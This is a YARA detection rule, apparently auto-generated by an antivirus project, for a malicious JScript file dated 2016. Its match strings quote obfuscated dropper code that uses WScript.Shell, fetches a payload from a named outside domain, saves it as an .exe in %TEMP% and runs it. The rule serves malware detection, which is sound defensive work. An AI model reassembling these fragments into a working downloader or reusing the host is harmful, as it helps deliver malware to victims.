rule sig_20160328_1905da904e09ba886eca96f7334ecf85 {
  meta:
    description = "datamaliciousorder - file 20160328_1905da904e09ba886eca96f7334ecf85.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5ea16dcf43e3f5b4fa17a4c1b6882948351384bc7b38f0cd52d2913cf93e2de7"

  strings:
    $s1  = "function Udjyse() {return Lamrvhh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"vIRkzOqD.exe\";};" fullword ascii
    $s2  = "do {WScript[Txcsy](Erfdxbvoyc() * 11)} while (Ckxxteb[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Lamrvhh = function Aqtiztwwc() {return WScript[Hvcst](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Ckxxteb[Wgjssnl](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s5  = "function Awwwoqwd(Jgikbc, Lvtxktsgpk){return Jgikbc - Lvtxktsgpk;};" fullword ascii
    $s6  = "function Iexnvjtnlm() {return ((Gngvc == true) && (Gngvc == Ugolr)) ? 1 : Uhsxgmvh;};" fullword ascii
    $s7  = "function Cvlqotj(Qivdkltkuf){Lamrvhh[\"Run\"](Qivdkltkuf, Uhsxgmvh, Uhsxgmvh);};" fullword ascii
    $s8  = "var Ijdldemspr = false;" fullword ascii
    $s9  = "return Awwwoqwd(Rgsmt, Bykhohmpa);" fullword ascii
    $s10 = "function Urzfjuiary(){return Hetrhtbnjq;};" fullword ascii
    $s11 = "Gngvc = true; " fullword ascii
    $s12 = "function Cqjhiec(Ggnvkmzlz) {var Schnrogwbn = (1, 2, 3, 4, 5, Ggnvkmzlz); return Schnrogwbn;};" fullword ascii
    $s13 = "function Erfdxbvoyc(){return 22;};" fullword ascii
    $s14 = "function Tikfwowu(){return Hvcst;};" fullword ascii
    $s15 = "var Ugolr = false;" fullword ascii
    $s16 = " while (Yoiwk){" fullword ascii
    $s17 = "var Iddmtr = new this[\"Date\"]();" fullword ascii
    $s18 = "var Gngvc = false;" fullword ascii
    $s19 = "Ugolr = true; " fullword ascii
    $s20 = "function Gbyis()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}